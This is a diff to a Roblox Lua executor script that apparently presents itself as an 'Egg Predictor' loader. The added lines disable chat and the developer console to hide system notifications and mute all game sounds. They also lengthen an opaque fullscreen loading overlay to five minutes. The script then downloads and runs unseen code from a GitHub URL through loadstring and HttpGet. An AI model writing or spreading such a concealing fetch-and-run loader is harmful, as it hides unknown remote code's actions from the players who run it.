@@ -1,7 +1,21 @@
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
+local StarterGui = game:GetService("StarterGui")
 
--- Tạo ScreenGui (KHÔNG TẮT UI GAME, KHÔNG XÓA GÌ)
+-- Tắt Chat và DevConsole để ẩn thông báo hệ thống
+pcall(function()
+	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.DevConsole, false)
+end)
+
+-- Tắt tất cả âm thanh trong game
+for _, sound in ipairs(game:GetDescendants()) do
+	if sound:IsA("Sound") then
+		sound:Stop()
+	end
+end
+
+-- Tạo ScreenGui
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "FullscreenLoadingUI"
 screenGui.ResetOnSpawn = false
@@ -9,7 +23,7 @@ screenGui.IgnoreGuiInset = true
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 screenGui.DisplayOrder = 1000
 
--- Executor hỗ trợ bảo vệ GUI (nếu dùng Synapse)
+-- Bảo vệ nếu dùng Synapse
 if syn and syn.protect_gui then
 	syn.protect_gui(screenGui)
 end
@@ -53,7 +67,7 @@ subText.TextXAlignment = Enum.TextXAlignment.Center
 subText.TextYAlignment = Enum.TextYAlignment.Center
 subText.Parent = background
 
--- Spinner hình mèo (ID cũ)
+-- Spinner hình mèo
 local spinner = Instance.new("ImageLabel")
 spinner.AnchorPoint = Vector2.new(0.5, 0.5)
 spinner.Position = UDim2.new(0.5, 0, 0.6, 0)
@@ -112,8 +126,8 @@ percentText.Size = UDim2.new(0.2, 0, 0.05, 0)
 percentText.Position = UDim2.new(0.4, 0, 0.8, 0)
 percentText.Parent = background
 
--- Loading 15 giây từ 1% -> 100%
-local totalDuration = 15
+-- Loading 300 giây (5 phút) từ 1% -> 100%
+local totalDuration = 300
 for i = 1, 100 do
 	progressBar:TweenSize(
 		UDim2.new(i / 100, 0, 1, 0),
@@ -126,8 +140,8 @@ for i = 1, 100 do
 	task.wait(totalDuration / 100)
 end
 
--- Loading xong: chỉ xóa UI loading, KHÔNG bật lại CoreGui (vì không tắt)
+-- Xoá UI loading sau 300s
 screenGui:Destroy()
 
--- Chạy script Egg Predictor sau khi load xong
+-- Gọi Egg Predictor
 loadstring(game:HttpGet("https://raw.githubusercontent.com/duydzxzx/Egg-Randomize/refs/heads/main/Egg%20Predictor"))()
